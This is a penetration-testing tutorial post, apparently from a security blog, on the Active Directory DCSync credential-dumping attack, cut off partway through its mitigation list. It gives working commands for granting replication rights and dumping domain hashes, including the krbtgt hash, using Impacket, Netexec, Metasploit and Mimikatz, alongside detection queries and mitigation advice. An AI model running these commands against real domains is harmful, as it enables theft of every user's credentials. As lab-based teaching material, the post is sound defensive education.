<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/credential-dumping/" rel="category tag">Credential Dumping</a>, <a href="https://www.hackingarticles.in/category/red-teaming/domain-credential/" rel="category tag">Domain Credential</a></span>            </div>
            <h1 class="post-title entry-title">Credential Dumping: DCSync Attack</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/credential-dumping-dcsync-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-05-26T18:24:37+00:00">May 26, 2020</time><time class="updated" datetime="2025-05-17T09:17:54+00:00">May 17, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;"><strong>Active Directory Credential Dumping DCSync Attack</strong> is a specialized technique used by attackers to extract credentials from a domain controller (DC) by simulating the behavior of a domain controller itself. This method leverages the Directory Replication Service (DRS) protocol, a legitimate mechanism used by domain controllers to replicate directory information. Attackers exploit this protocol to pull sensitive data, such as NTLM password hashes and Kerberos tickets, without triggering conventional alerts.</span></p>
<h5><span style="color: #000000;"><strong>In this post, we will discuss:</strong></span></h5>
<ol>
<li><span style="color: #000000;">Setting up a lab environment to simulate the attack.</span></li>
<li><span style="color: #000000;">Understanding the DRS protocol and how the attack works.</span></li>
<li><span style="color: #000000;">Why such misconfigurations occur in real-world scenarios.</span></li>
<li><span style="color: #000000;">Exploiting the misconfiguration.</span></li>
<li><span style="color: #000000;">Mapping the attack to MITRE ATT&amp;CK.</span></li>
<li><span style="color: #000000;">Detecting the attack.</span></li>
<li><span style="color: #000000;">Mitigation strategies.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjdreG71l2t6g46FiDQpn_hYMKVewc0mCavACoDu-byGXLe16pnk0Ru1ih8Y9hfL5ppn_XVS7yjmvWdKE75aBTWUqFw4Y3wBlNJQXDKKQs2ZT60e3OD7nUsPbzYLwa9eD0WOspXtDENdyrMtLtG3Q8q1HKwQxmAtJsYJntB473ynFEINs9n1KX9MsKfGRI3/s16000/0.png"/></span></p>
<h3><span style="color: #800000;">Lab Setup</span></h3>
<h5><span style="color: #000000;"><strong>Requirements:</strong></span></h5>
<ul>
<li><span style="color: #000000;">A virtualized environment (e.g., VMware, VirtualBox, or Hyper-V).</span></li>
<li><span style="color: #000000;">Windows Server configured as a Domain Controller.</span></li>
<li><span style="color: #000000;">A Windows client machine.</span></li>
<li><span style="color: #000000;">Tools: Impacket, Mimikatz, Netexec, and Metasploit.</span></li>
</ul>
<h5><span style="color: #000000;"><strong>Steps:</strong></span></h5>
<p><span style="color: #000000;">Domain Controller Configuration:</span></p>
<ul>
<li><span style="color: #000000;">Install and configure Windows Server as a DC where domain name is ignite.local and IP is defined as static 192.168.1.48.</span></li>
<li><span style="color: #000000;">Set up Active Directory (AD) with a few users and groups.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEg3xtnof5L7w91dfOPgwMbaiY6FCjEQk78AagpgepvydgFpkmoSzb_clDpsjK6Hcy3FtHpjKzQqu8lsZ0x9BmRER45OOS0MwBuAYjd2J4GCZcO2VPVPZDEIGbFlk1p9PTx_fS_XphSuFR2Usb4-eh_nO_Eo9Wqg3I7NJtHA-6zu4nhJU9WVl1vc95A0pdRH/s16000/1.png"/></span></p>
<p><span style="color: #000000;"><em>                                                             Figure 1</em></span></p>
<p><span style="color: #000000;"><strong>Help:</strong> If you don’t know Active Directory Installation and Lab setup read more from <a style="color: #000000;" href="https://www.hackingarticles.in/active-directory-pentesting-lab-setup/">here</a></span></p>
<h5><span style="color: #000000;"><strong>Misconfiguration Setup:</strong></span></h5>
<p><span style="color: #000000;">Assign “Replicating Directory Changes” or higher permissions to a non-privileged user.</span></p>
<p><span style="color: #000000;">To grant “Replicating Directory Changes” permission to a user (e.g., Aarti) for the ignite.local domain:</span></p>
<ul>
<li><span style="color: #000000;">Open Active Directory Users and Computers Press Win + R, type dsa.msc, and press Enter.</span></li>
<li><span style="color: #000000;">Enable Advanced Features, in the top menu, go to View and select Advanced Features.</span></li>
<li><span style="color: #000000;">Locate the Domain Object, navigate to the root of the domain (e.g., ignite.local).</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh7jzwv5tfhf53V0kk5mrWK7gPfUBHQFVyfmnwWh9hf5-oGe2-8VQMZ3lYzCSMQFj8nZRCFU6QmZ3fn8h60CLpi3QCafZBF2NzIux-3UdP8O_bzeB9GFh-T8UkHWRFBWVYvs9gXp2cNY1iFftslvtuUVzvDJyPaNVowjVvjxuzocXEl2R2hoSK0AtJMhJb/s16000/2.png"/></span></p>
<ul>
<li><span style="color: #000000;">Open Properties: Right-click the domain name and select Properties.</span></li>
<li><span style="color: #000000;">Access Security Tab: Go to the Security tab and click Advanced.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjQHBOWgrfF3JOrqBaHrGn7bj7zKLu0buxaT0KuQMe5-l0lmuetTOxtB2suhQr7eXgbDM1tJdbTQVtEj2vvRgyivjKVfd4tgcuBOXW-7G1DSeQQa74LCT7LeVkKP2kL1SWM7Hofp5fCV4A1I4jWjSZ-_6HsIAvw_ZPXKMzXwhIdaeIt-UMUUiJ1Dv0P5tgp/s16000/3.png"/></span></p>
<ul>
<li><span style="color: #000000;">Add Permissions: Click Add to open the permissions dialog. In the Principal field, type Aarti and click Check Names. Click OK to confirm.</span></li>
<li><span style="color: #000000;">Set Specific Permissions: In the Permissions field, select Replicating Directory Changes and Changes All.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgThcAtjw_trDMEVK4I0HZlF9Igs5vLs5ZTjGmkR2njLYGAqYa33XVSX49fs2Xxx6AGxJr-U4tVi0RzMGM05lRY6QGZVK54Z_Q1TWY3kUt1tVevq_k5Wjn0LPCfSz5gy7M6GjovoonEw12yOPC9JjFFKj0ZPL4lD5piSHZ4SxGCS6J2w36IQzjRy5Mjv9N2/s16000/4.png"/></span></p>
<h3><span style="color: #800000;">Remote Method for Lab Setup via Kali</span></h3>
<p><span style="color: #000000;">If you have administrator credentials or you own the domain admin privilege account, then use Bloody-AD tool for adding or remove DC Sync permission.</span></p>
<p><span style="color: #000000;">Give DCSync right to the principal identity</span></p>
<h4><span style="color: #000000;">Bloody AD</span></h4>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 add dcsync aarti</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgjcZ2_RiGKR0mQMTfUQbOyPKfyJb5vOFMUBLXQVDRGFI5o_5LRZTkVUshaJSi3cw_m-j21raO08T4NlLFUMpcM-4JuAAsnmfzy9cOvcwiOiL64Dz_nJDcQRIDFiMftoH-LcFqG1YtvSfU3riMBg_Cay6qq4Qirn4YTGhyJ7RZKIf3Qui948OMwJkaHFPPm/s16000/5.png"/></p>
<p><span style="color: #000000;">Remove DCSync right to the principal identity</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodyAD --host 192.168.1.48 -d ignite.local -u administrator -p Ignite@987 remove dcsync aarti</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfyoKKMSA1kqqmOaxWwxf3aXTXtg8FCGbTW1K_X3-cg87haruwQ8dq8J1VjFl7sFDioiJ844kfpUN-hkYwjc0Kq1REB0wX-6T_hNFy5yhdzQL8AXW8fEsbYkMdQLuP5G0E0riqPM3qhIZBq0ZtavwT_H119jYBW4FmYZFm9-nBrOi_0AsAYW-ymTpsb9hG/s16000/6.png"/></p>
<h4><span style="color: #000000;">Ldap_shell</span></h4>
<p><span style="color: #000000;">Similarly, ldap_shell can add or remove the DS-Replication Privilege on domain user. account.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ldap_shell ignite.local/administrator:Ignite@987 -dc-ip 192.168.1.48
set_dcsync aarti
del_dcsyn aarti</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiy0UI9bD7Ai0OwgWpk8mZufo5cjSqoDzgKgokHYxELO9EtGTi7xGEQ4K7Y7emkv1na8VF3bYzAaaAUZRaoQ86BbU4tqFUTzsNtVmDrrxtk9ZUhFDWFSvHMq1BFHAFWCDmHTBEoodLX7TT-407Y0Dx7tJ1yXFUb_Bj69AQEHDyImJYssrTA9vUIj_xuNnBX/s16000/7.png"/></p>
<h4><span style="color: #000000;">Impacket </span></h4>
<p><span style="color: #000000;">Similarly, impacket Dacledit can be used to add or remove DCSync right on domain user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit ignite.local/administrator:'Ignite@987' -action write -rights DCSync -principal aarti -target-dn 'DC=ignite,DC=local' -dc-ip 192.168.1.48</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhfztwpbCPKXUGhnmA-Qq_G4f-wQfE5cGau_NnZuCouJ2MpF58TER2ttP-orCUdNqCVxwqebT_RUMd4Wj3qQElWboMoxs3xZyeDExpZd72boyweAFW0ZrAxcKLAlUmvVz-XPia9G1uEK0knKcDgDvaTnVM3JEXQX5vCJuZhL-6WFO2vSG3xPuujyLiYQpAy/s16000/8.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-dacledit ignite.local/administrator:'Ignite@987' -action remove -rights DCSync -principal aarti -target-dn 'DC=ignite,DC=local' -dc-ip 192.168.1.48</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_SYMsb2uk7nRlG2qPNwZbb1LeL51_8UbQmJFE-mzvn8VHP9nAqedhIfLGfI8WkJBv81CeELJNxSuU1UYyQSzTsfKSyjvpc15_Avv9ooqlZjzX4viR_n9sPLN-8AiEK-90SFfyKBY6ijx4iyPB6ei4m-tj4a5W9WfdTPTzrSm_MgptjXxzsL2seE3V7bwg/s16000/9.png"/></p>
<h4><span style="color: #000000;">Impacket-ntlmrelayx</span></h4>
<p><span style="color: #000000;">“An attacker may employ an NTLM relay attack to execute a DCSync operation for a chosen domain user. When a privileged account inadvertently interacts with the attacker-controlled IP, the impacket-ntlm tool can intercept and capture the privileged credentials. This allows the attacker to grant Directory Services (DS) replication permissions to the compromised domain user, significantly expanding their access within the network and potentially exposing sensitive directory data.”</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgTgaKlek-sfYnWeLoG7GJuw1GVQdYijFS-Ql7ggven5ke6TJ3QV9brYYh-p2ifYh8fd5_19foFbePDOki3a297fxoeKUKZbkf5EmVEOJQ31_x6dANB5YFoE2B8mk_JFTJg2ECrN_AGSJU6i5iLOcITrLXfH4OmdnjbldW3jD1rS6YYzxSW40Jp0wqMNxOJ/s16000/13.png"/></p>
<p><span style="color: #000000;">Below image shows the target user has authenticated itself over the malicious network.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh2n2IZxhHlDJ20Mv5cMvhquvICcMeSbYjWCc0W5xUDrh0YXW0UeTaCyEbH8SUtQMa_t9G8T6W6kmHBdHg8ORzV2jbmOWSyYSXejXDk-l4DlNwGJTkUeRDt8KX-bw5UJKfloqiSijQv73qyj0pJBw0UAq60LNy1YxnfFC71-30DBg2m20roKX-E26P1gcPa/s16000/14.png"/></p>
<p><span style="color: #000000;">A successful ldap authentication has been captured and the User “raj” has been added to Enterprise group and now owns the permission for DS Replication Get Change.</span></p>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgqHTVG5TaY4-VUvsGzMBdOzwSP8sxH4uC5xqSrAbD-PWkmjYytdHcvsJ6fR-phtIus1X40mLu71TWvhCcPS_SdSVkHBHepjqwgTtbifky_aZ6C0pT4XUk7Tf2IB_IRCLzUW6QYZbYra1s2gPPKh7vFMhjj-Re_sW0cj1UTEOsSANOHUxreTzjTP1TLxuw2/s16000/15.png"/></p>
<h4><span style="color: #000000;">Certipy-ad</span></h4>
<p><span style="color: #000000;">If a threat actor obtains the PFX file of a privileged user, such as an administrator, they can extract the corresponding certificate and private key to assign DCSync rights. Unlike traditional approaches that require the administrator’s password or NTLM hashes to grant directory replication permissions, this method relies solely on access to the PFX file, significantly reducing the attack complexity.”</span></p>
<p><span style="color: #000000;">Commands to extract the certificate and private key:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certipy-ad cert -pfx administrator.pfx -nokey -out "user.crt"
certipy-ad cert -pfx administrator.pfx -nocert -out "user.key"</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgt8t0U6dU6g7OEU0DdYsz-ncpqo76go8CJV3CCiYEAXMnH06r-ZnkB-ePj5SEXyLzQfgO4BiCWWRbciBvGI65ATQvoI20eHfeGDyTRozRK64H6u_gXB4NafnZ6dIgiS9PnmVxx1QxpZsCxDiugK4X8XF6Aqa2k8UrfE-c5RfSL0s8dRWYNWX2UNvnN_3wy/s16000/10.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">./passthecert.py -action modify_user -crt user.crt -key user.key -domain "ignite.local" -dc-ip 192.168.1.48 -target aarti -elevate</pre>
<p><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgZAlvHr6O_lAxTJaAUJVXTnntbqEkodKP6-JNc5SpdNDwmHI-XKVZByhoiYoDSOF2-dw6wWcZomFXa9cUvDrgKAw3bBg58xdVlDDxphMHBFryYeWeffvUvCtPqa3_tnOSgG2uTmjwywfM7Iz_UZLa0DlnDTuH-jrlLtVapOhA_ZSXvovBRymYjS9n_U8st/s16000/11.png"/></p>
<h3><span style="color: #800000;">Understanding the DRS Protocol and Working of the Attack</span></h3>
<p><span style="color: #000000;"><strong>What is the Directory Replication Service (DRS) Protocol?</strong></span></p>
<p><span style="color: #000000;">The DRS protocol is a fundamental component of Active Directory that facilitates data replication between domain controllers. This ensures consistency across the AD environment. The protocol operates over specific endpoints, allowing DCs to share user accounts, group memberships, and other directory objects.</span></p>
<p><span style="color: #000000;"><strong>DRSUAPI and DsGetNCChanges Requests</strong></span></p>
<ul>
<li><span style="color: #000000;">DRSUAPI (Directory Replication Service (Update) API): This API is used for managing and performing replication operations within Active Directory. Attackers interact with this API to request sensitive directory data.</span></li>
<li><span style="color: #000000;">DsGetNCChanges: This is a specific method within DRSUAPI that enables domain controllers to retrieve changes from another domain controller. During a DC Sync attack, this request is abused to extract directory information like password hashes.</span></li>
</ul>
<p><span style="color: #000000;"><strong>How Does the DC Sync Attack Work?</strong></span></p>
<ol>
<li><span style="color: #000000;">Abusing Permissions: An attacker obtains or abuses an account with “Replicating Directory Changes” permissions. This permission is typically granted to accounts or systems that legitimately need to replicate directory information, such as backup solutions or custom scripts.</span></li>
<li><span style="color: #000000;">Mimicking a Domain Controller: Using tools like Mimikatz or Impacket, the attacker simulates a domain controller and sends replication requests to the target DC.</span></li>
<li><span style="color: #000000;">Extracting Data: The target DC, trusting the request as legitimate, provides the requested directory information, including sensitive credentials like password hashes and Kerberos tickets.</span></li>
<li><span style="color: #000000;">Exploiting the Information: The attacker uses the extracted credentials for further attacks, such as Pass-the-Hash, lateral movement, or privilege escalation.</span></li>
</ol>
<h3><span style="color: #800000;">Why Do Such Misconfigurations Happen?</span></h3>
<p><span style="color: #000000;">Business Scenarios Leading to Misconfigurations:</span></p>
<ol>
<li><span style="color: #000000;">Third-Party Integrations: External applications, such as monitoring tools or backup solutions, may require “Replicating Directory Changes” permissions to function. Admins might assign these permissions broadly for convenience.</span></li>
<li><span style="color: #000000;">Operational Efficiency: To avoid frequent access issues, administrators may grant elevated permissions to service accounts without a thorough understanding of the risks.</span></li>
<li><span style="color: #000000;">Lack of Awareness: Organizations with limited cybersecurity expertise may overlook the security implications of assigning replication permissions to non-critical accounts.</span></li>
<li><span style="color: #000000;">Legacy Systems: Older systems or processes might rely on excessive permissions that have not been audited or updated for modern security standards.</span></li>
</ol>
<p><span style="color: #000000;"><strong>Real-World Example:</strong></span></p>
<p><span style="color: #000000;">Consider a scenario where a backup software vendor requests “Replicating Directory Changes” permissions for its service account. An administrator, aiming to ensure uninterrupted backups, grants these permissions without restricting them to the necessary scope. This opens a potential attack vector for adversaries.</span></p>
<h3><span style="color: #800000;">Exploitation</span></h3>
<p><span style="color: #000000;">Using the tools listed, the steps to perform a DC Sync attack are as follows:</span></p>
<h3><span style="color: #800000;">Enumeration with BloodHound</span></h3>
<p><span style="color: #000000;">BloodHound is a powerful tool for enumerating Active Directory permissions and relationships. To identify accounts with replication permissions:</span></p>
<p><span style="color: #000000;">Considering a scenario where threat actor has compromised the USER-AARTI account, or this is grey box testing where the threat actor will use bloodhound to enumerate the possibilities for launching DC Sync attack with the help of following command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bloodhound-python -u aarti -p Password@1 -ns 192.168.1.48 -d ignite.local -c All</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgQIXEHPqAqgEOevWSw8DzbnfP590XZp_9aK6Fh2ort-xQivt3q6xtJpvlcJj3M-pDuD9VzDtnSOSCcDSbbn6D5ofSpyaHGcjdepcH0IeIhjKKRhaUogI4je9pebmXDJFOHKen85aX2MRjqscIDj1UIU0gp_KaE11C5Vztodoo5mm7u4rG6sppEFGIv6ylx/s16000/8.png"/></span></p>
<p><span style="color: #000000;">Import the collected data into BloodHound and expend the Node info for USER AARTI to enumerate the First Degree Object Control.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnPLFy8NsHG6vzYxTBnLd6Z72hQcVaVzC2RPerkCt9C35xZV1hQfrdd3l3laO2BjJ7jVYZiQVNHGFbqTJTSKpSn6vImFheKvhopv5XAdpOBlcFI91f-ES04M8A7Hc3P_Gy83K55EY2yNLxjgvPtVbQsdeY6hfJkh2umXZ1W4a9oqJoJewQxKLlwszyjMwi/s16000/9.png"/></span></p>
<p><span style="color: #000000;">Analyze the “DC Sync” in the permissions graph and right click to get the help or hint for exploitation from bloodhound.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhbBcn7XZszR3Eonz6z6GlUBUVGb3kx5gCe6DhcUKh1q0oAP3fGd20f9Cj3Y63d5eRVS8_ewUL7E_PDk3OQ04QJAiml7554zo2dl43dU1xP12LPEG5LA91OCtrO1tDBKN0Ee3eNxPzL4s6T0KjUAU0G6sbpVD0wjGkzwK7KiNnru6C3KyPQEE1A2AjOmpbG/s16000/10.png"/></span></p>
<p><span style="color: #000000;">This will show misconfigured permission for the and step to proceed exploitation from Window or Linux based tools.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEibleDAiVlg71JN87fkmuA-w-b2QXJCfjRXhTAXrxuRj_vVQyXac-6Jnnwu9skjh7ashxRBILaSIwC5j9lP6GW5snVHcJ8yqZe2ScA1IECDeldtsAtmWlVUI-Y8sSWT4dYiBUhjYh5sxctl91QXR5jgMHYMOHLIjed98a8wSpsAxJXypBWtcdApSsSoW5w4/s16000/11.png"/></span></p>
<p><span style="color: #000000;"><strong>HELP:</strong> If you don’t know how to use Bloodhound read more from <a style="color: #000000;" href="https://www.hackingarticles.in/active-directory-enumeration-bloodhound/">here</a></span></p>
<h3><span style="color: #800000;">Impacket</span></h3>
<p><span style="color: #000000;">Execute the following command to extract password hashes:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-secretsdump 'ignite.local'/'aarti':'Password@1'@'192.168.1.48'</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgh-A5OJE4E984xoqAYWEEPMt72B36NpOCQzeWm4HBHjhWvcLMKjDRPWDCvOmALm5b2SzMSvd2u_hjMAm3phWnMfHLnZ-dHR__l7he_8z8klVTww5gmMbVhT93Wl6lu06pL4a_Q64JVjKCdduGZ0_E-zJw66Fldkd04Ocd3R4zTdTvnaHp7tHM1pfFvQNVV/s16000/12.png"/></span></p>
<h3><span style="color: #800000;">Netexec</span></h3>
<p><span style="color: #000000;">Use Netexec to validate permissions and execute lateral movement payloads if required.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi2vkw9edZL5kpYXfL7apwSpN8GG-oLkXRHM6E-Vkinrwah-rpMlDqRXyeD83YUdgTxlk7NUZyaW0q86cl2uPdYAW4WO9NgwPQpRQPwQ7X-FysZTguDKQPho33bgeLvTyyxkWFRhwjJeOfxu18HNWEHmJr_FRX42E0W-vXl5cLn4fq5Yj2F_RrFID4AJOYu/s16000/13.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nxc smb 192.168.1.48 -u 'aarti' -p 'Password@1' --ntds --user administrator</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjzOrpLuJvNIDTjE9QuplJtkKAEgF2OAN-hQxgTxj0qXQ0x4xnJE5LRjAY4tPwqm_DvdnHZFT9qC1rRXfuVI0l6HUs1ylK6ZCaoY09E-xm2O4GmVu7wGQF6Psc3fwcXQpIuMRWYeGKjrpxGaRbIX34GIVI-1l8OhG9fda21njPvwmi5wDAtYJfCJAwvcIDZ/s16000/14.png"/></span></p>
<h3><span style="color: #800000;">Metasploit</span></h3>
<p><span style="color: #000000;">Leverage the “dcsync” module within Metasploit for a streamlined attack workflow:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/smb/impacket/secretsdump
set rhosts 192.168.1.48
set smbuser aarti
set smbpass Password@1
run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgMZtwX3P3D4hvyrk5VoIYtQiJYsEadaE4d-o2mUDFvKxr4HAelFbT3pyGaPGwHbYq0fuDRKj8-EIYuRcj8Fka34sxqg2SF9VT0HwdCtRE1yKNtZc2v401Bzt9oZpjyaKtcKlasSVze6CTLW3CaTr4Rrru0YfzlU6H1947shl9FaUgV6Z7BXJ92rf8rXfZB/s16000/15.png"/></span></p>
<h3><span style="color: #800000;">Mimikatz</span></h3>
<p><span style="color: #000000;">Run Mimikatz as an elevated user and execute:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
lsadump::dcsync /user:&lt;target_user&gt;
lsadump::dcsync /domain:ignite.local /user:krbtgt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiKOrfAn3H04S-077VklN63W5RbqBxIhKrUxIrZkutIeKyQrV74QiB2DSjPJ953RO6F6eAUUDzn-NfaWCPNVfeglnZDXL0-JHPPWRTfamPoeUBhxJCfJ5DVORPBNrhRvk_nwOcthoe4VGNty8L9JPab3rCMdHKqq-hb0LEluTxTmyihW20h5mXxdKovvR8S/s16000/50.png"/></span></p>
<h3><span style="color: #800000;">Mapping the Attack to MITRE ATT&amp;CK</span></h3>
<p><span style="color: #000000;">DC Sync attacks align with the following tactics and techniques in the MITRE ATT&amp;CK framework:</span></p>
<p><span style="color: #000000;"><strong>Tactic:</strong> Credential Access (<a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0006/">TA0006</a>)</span></p>
<p><span style="color: #000000;"><strong>Technique:</strong> DCSync (T1003.006)</span></p>
<p><span style="color: #000000;">Adversaries abuse the domain replication protocol to extract user credential hashes and other sensitive data from a domain controller. This technique mimics the behavior of a legitimate domain controller.</span></p>
<p><span style="color: #000000;"><strong>Tactic:</strong> Privilege Escalation (<a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0004/">TA0004</a>)</span></p>
<p><span style="color: #000000;"><strong>Technique:</strong> Abuse Elevation Control Mechanism (T1548)</span></p>
<p><span style="color: #000000;">Using the obtained hashes, attackers may escalate their privileges within the network.</span></p>
<p><span style="color: #000000;"><strong>Tactic:</strong> Defense Evasion (<a style="color: #000000;" href="https://attack.mitre.org/tactics/TA0005/">TA0005</a>)</span></p>
<p><span style="color: #000000;"><strong>Technique:</strong> Valid Accounts (T1078)</span></p>
<p><span style="color: #000000;">The use of replication permissions by valid accounts can evade detection mechanisms that focus on unusual user activity.</span></p>
<h3><span style="color: #800000;">Detection Methods</span></h3>
<p><span style="color: #000000;">To detect DC Sync attacks, monitor the following indicators of compromise (IoCs):</span></p>
<p><span style="color: #000000;"><strong>Key Event Logs to Monitor</strong></span></p>
<ul>
<li><span style="color: #000000;"><strong>Windows Security Event Logs:</strong></span></li>
</ul>
<p><span style="color: #000000;"><strong>Event ID 4662</strong>: Indicates a permissioned operation was performed on an object in Active Directory. Look for entries that specify the access rights DS-Replication-Get-Changes or DS-Replication-Get-Changes-All.</span></p>
<p><span style="color: #000000;">Example:</span></p>
<p><span style="color: #000000;">An operation was performed on an object:</span></p>
<p><span style="color: #000000;">Object: CN=Schema,CN=Configuration,DC=example,DC=com</span></p>
<p><span style="color: #000000;">Accesses: DS-Replication-Get-Changes</span></p>
<p><span style="color: #000000;">Caller User Name: attacker_user</span></p>
<ul>
<li><span style="color: #000000;"><strong>Directory Services Logs:</strong></span></li>
</ul>
<p><span style="color: #000000;">Enable <strong>Directory Service Access</strong> auditing in the Group Policy:</span></p>
<p><span style="color: #000000;">Navigate to <strong>Advanced Audit Policy Configuration</strong> &gt; <strong>DS Access</strong> &gt; <strong>Audit Directory Service Access</strong>.</span></p>
<p><span style="color: #000000;">Logs will provide details about access to Active Directory objects using replication permissions.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Event ID 1644</strong> (Verbose Logging):</span></li>
</ul>
<p><span style="color: #000000;">Enable <strong>Field Engineering Logging</strong> for Active Directory replication:</span></p>
<p><span style="color: #000000;">HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Diagnostics</span></p>
<p><span style="color: #000000;">Set 15 Field Engineering to 5 (verbose level).</span></p>
<p><span style="color: #000000;">This logs DsGetNCChanges requests and can capture excessive or anomalous replication traffic.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Network Logs:</strong></span></li>
</ul>
<p><span style="color: #000000;">Use network monitoring tools to capture and analyze <strong>DRSUAPI traffic</strong>:</span></p>
<p><span style="color: #000000;">Look for unusual DsGetNCChanges requests originating from non-DC machines.</span></p>
<p><span style="color: #000000;">Ports commonly used include <strong>135 (RPC)</strong> and <strong>389 (LDAP)</strong>.</span></p>
<h3><span style="color: #800000;">SIEM Queries and Alerts</span></h3>
<ol>
<li><span style="color: #000000;"><strong>Unusual Replication Traffic:</strong></span></li>
</ol>
<p><span style="color: #000000;">Query logs for DsGetNCChanges requests originating from machines that are not domain controllers:</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">SELECT *
FROM EventLogs
WHERE EventID = 4662
 AND Accesses IN ('DS-Replication-Get-Changes', 'DS-Replication-Get-Changes-All')
  AND CallerComputer != 'DomainController'</pre>
<p><span style="color: #000000;"><strong>     2. Behavioral Anomalies:</strong></span></p>
<p><span style="color: #000000;">Detect high-frequency replication requests from service accounts not usually involved in replication activities.</span></p>
<h3><span style="color: #000000;"><span style="color: #800000;">Mitigation Strategies</span></span></h3>
<ul>
<li><span style="color: #000000;"><strong>Permission Hardening:</strong></span></li>
</ul>
<p><span style="color: #000000;">Regularly audit permissions on AD objects.</span></p>
<p><span style="color: #000000;">Remove unnecessary “Replicating Directory Changes” permissions from non-privileged accounts.</span></p>
<ul>
<li><span style="color: #000000;"><strong>Privileged Account Management:</strong></span></li>
</ul>
